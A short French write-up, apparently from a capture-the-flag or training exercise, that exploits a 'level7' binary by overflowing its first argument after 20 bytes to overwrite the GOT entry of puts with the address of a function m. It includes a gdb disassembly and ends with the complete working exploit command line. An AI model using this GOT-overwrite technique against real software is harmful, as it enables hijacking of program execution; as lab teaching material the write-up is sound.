Ici, nous avons un binaire qui prend deux arguments.
Le premier argument va nous permettre (une fois qu'on aura trouver l'offset) de definir l'adresse ou on veux réecrire
et le second argument va nous permettre d'aller a l'adresse ou on veux aller.
En resumé: premier argument: overflow et second argument: jump

On vois qu'il y a un segfault a partir de + 20 caracteres dans le premier argument.

Ensuite, nous voyons qu'il y a la function puts appeller. C'est celle ci que nous allons réecrire.
Nous faisons un disas 0x8048400

ce qui nous donne:

Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928 // Ici l'adresse a overwrite
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.

ensuite nous faisons un print &m qui nous donne l'adresse de m
0x80484f4

avec tous ca nous pouvons donc ecrire notre ligne de commande

./level7 `python -c 'print "A" * 20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`